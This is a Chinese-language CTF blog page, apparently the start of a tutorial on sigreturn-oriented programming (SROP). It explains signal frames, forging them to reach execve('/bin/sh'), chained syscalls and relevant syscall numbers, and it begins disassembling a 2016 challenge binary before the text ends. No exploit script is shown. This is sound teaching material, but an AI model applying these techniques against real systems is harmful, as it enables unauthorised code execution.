@@ -1,0 +1,496 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门（1-3-10）-高级ROP-SROP | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN入门（1-3-10）-高级ROP-SROP 参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107512670  signal机制signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（1-3-10）-高级ROP-SROP">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="PWN入门（1-3-10）-高级ROP-SROP 参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107512670  signal机制signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-05/800/450">
+<meta property="article:published_time" content="2020-08-24T03:31:00.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:15.635Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-05/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN入门（1-3-10）-高级ROP-SROP",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/",
+  "image": "https://picsum.photos/seed/blog-cover-05/800/450",
+  "datePublished": "2020-08-24T03:31:00.000Z",
+  "dateModified": "2026-07-03T14:46:15.635Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（1-3-10）-高级ROP-SROP',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-05/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门（1-3-10）-高级ROP-SROP</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（1-3-10）-高级ROP-SROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-24T03:31:00.000Z" title="发表于 2020-08-24 11:31:00">2020-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:15.635Z" title="更新于 2026-07-03 22:46:15">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">6.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN入门（1-3-10）-高级ROP-SROP"><a href="#PWN入门（1-3-10）-高级ROP-SROP" class="headerlink" title="PWN入门（1-3-10）-高级ROP-SROP"></a>PWN入门（1-3-10）-高级ROP-SROP</h1><blockquote>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/107512670">https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;107512670</a></p>
+</blockquote>
+<h2 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h2><p><strong>signal 机制是类 unix 系统中进程之间</strong><span style="color: #F5222D">相互传递信息</span><strong>的一种方法。<strong>一般，我们也称其为<span style="color: #F5222D">软中断信号</span>，或者</strong><span style="color: #F5222D">软中断</span></strong>。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般分为三大步：、</p>
+<blockquote>
+<p>kill可不是字面意思–杀死进程<br><strong>KILL功能描述：用于向任何进程组或进程发送信号。</strong></p>
+</blockquote>
+<p>① 内核向某个进程<strong>发送signal机制</strong>，该进程会被暂时<strong>挂起</strong>，<strong>进入内核态</strong></p>
+<p>② 内核会为该进程保存相应的上下文，<strong>跳转到之前注册好的signal handler中处理signal</strong></p>
+<p>③ <strong>signal返回</strong></p>
+<p>④ 内核为进程恢复之前保留的上下文，恢复进程的执行</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598239928005-92bbf6dd-56db-432d-90c7-6aeb49bfabaf.png"></p>
+<ol>
+<li>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</li>
+<li>内核会为该进程保存相应的上下文， <strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong> 。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为 <strong>Signal Frame</strong> 。 <strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong> 之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>
+</ol>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598239928334-6b709e70-5bde-4b24-96fc-4d59957229e2.png"></p>
+<p>对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x86</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：</p>
+<ul>
+<li><strong><span style="color: #F5222D">Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。</span></strong></li>
+<li>由于内核与信号处理程序无关(kernel agnostic about signal handlers)，它并不会去记录这个signal对应的Signal Frame， <strong><span style="color: #F5222D">所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。</span></strong></li>
+</ul>
+<p>说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。</p>
+<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p><span style="color: rgba(0, 0, 0, 0.87)">首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</span></p>
+<p><span style="color: rgba(0, 0, 0, 0.87)"></span><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598252882215-a549c428-3497-43d6-aeb0-546dc6e25204.png"></p>
+<p>当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。</p>
+<h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>
+<ul>
+<li><strong>控制栈指针。</strong></li>
+<li><strong>把原来rip指向的<code>syscall</code> gadget换成<code>syscall; ret</code> gadget。</strong></li>
+</ul>
+<p>如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598252939278-77c21600-42e5-4240-8cc5-43f7e68fe4a2.png"></p>
+<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件</p>
+<ul>
+<li><p><strong>可以通过栈溢出来控制栈的内容</strong></p>
+</li>
+<li><p><strong>需要知道相应的地址</strong></p>
+</li>
+<li><p><strong>“&#x2F;bin&#x2F;sh”</strong></p>
+<ul>
+<li><strong>Signal Frame</strong></li>
+<li><strong>syscal</strong></li>
+<li><strong>sigreturn</strong></li>
+</ul>
+</li>
+<li><p>需要有够大的空间来塞下整个sigal frame</p>
+</li>
+</ul>
+<p>此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598252941548-b840ddcb-b5c4-437d-97bb-c23a18036009.png"></p>
+<p>并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&amp;return代码片段。如下</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598252939417-6d013ea4-064a-4202-9843-9d981d030da1.png"></p>
+<p>但是目前它已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</p>
+<p><span style="color: #F5222D">值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX&#x3D;15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</span></p>
+<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p><strong>在目前的pwntools中已经集成了对于srop的攻击。</strong></p>
+<h2 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h2><p>在汇编代码中看到存在systemcall的时候可以考虑采用该方法进行尝试</p>
+<p>下面给出我们将会用到的64位函数及函数调用号和函数原型</p>
+<table>
+<thead>
+<tr>
+<th>系统调用</th>
+<th>调用号</th>
+<th>函数原型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>read</td>
+<td>0</td>
+<td>read( int fd, void *buf, size_t count )</td>
+</tr>
+<tr>
+<td>write</td>
+<td>1</td>
+<td>write( int fd, const void *buf, size_t count )</td>
+</tr>
+<tr>
+<td>sigreturn</td>
+<td>15</td>
+<td>int sigreturn( … )</td>
+</tr>
+<tr>
+<td>execve</td>
+<td>59</td>
+<td>execve( const char *filename, char *const argv[], char *const envp[] )</td>
+</tr>
+</tbody></table>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><blockquote>
+<p>附件下载：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop</a></p>
+</blockquote>
+<p>将文件下载下来，检查一下文件的保护情况：</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598240775225-fbb44684-97fa-4568-94df-7396f85987c4.png" alt="QQ截图20200824114607.png"></p>
+<p>64位程序，只开启了NX保护，这意味着我们不能在栈上注入shellcode</p>
+<p>将文件扔到IDA中：</p>
+<p><img src="/assets/posts/pwn-1-3-10-rop-srop-17sydsq/assets/1598240875785-43a0c018-3ca0-44fb-9a8c-b9c3fad4dce1.png" alt="QQ截图20200824114746.png"></p>
+<p>emmm，这就是pwn吗？只给了这么一小段代码来getshell。爱了爱了…</p>
+<p>将汇编代码摘出来，加上注释我们看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor     rax, rax       #异或rax，相当于把rax清零</span><br><span class="line">mov     edx, <span class="number">400</span>h      #将<span class="number">400</span>h放入rdx的低<span class="number">16</span>位edx中</span><br><span class="line">mov     rsi, rsp       #将栈顶的内容赋值给rsi </span><br><span class="line">mov     rdi, rax       #将rax==<span class="number">0</span>赋值给rdi中 </span><br><span class="line">syscall                #执行系统调用 </span><br><span class="line">retn                   #函数返回，pop rip（rsp+<span class="number">8</span>）</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在64位程序中，函数的一参存放在rdi寄存器中，二参存放在rsi寄存器中，三参存放在rdx寄存器中。</p>
+</blockquote>
+<p>从上面的代码可以看到，rdi、rsi、rdx三个寄存器分别存放了系统调用的三个参数。</p>
+<p>因为在64位程序中系统调用号为0的函数为read函数，所以实际上上述的代码执行的是syscall(0, 0, rsp, 0x400)，也就是read(0, rsp, 0x400)，向栈顶读入0x400字节的内容。</p>
+<p>由于读入的数据过大,毫无疑问,会发生栈溢出.</p>
+<p>我们使用edb来调试一下，这是一个基于Linux的elf文件调试器。</p>
+<blockquote>
+<p>edb和Windows上的OD使用差不多，这里就不再过多的介绍了</p>
+</blockquote>
+<hr>
+<p>什么？你问edb的安装方式？</p>
+<p>答：<a target="_blank" rel="noopener" href="https://github.com/eteran/edb-debugger">https://github.com/eteran/edb-debugger</a></p>
+<p>附上Ubuntu &gt;&#x3D; 15.10的安装脚本：</p>
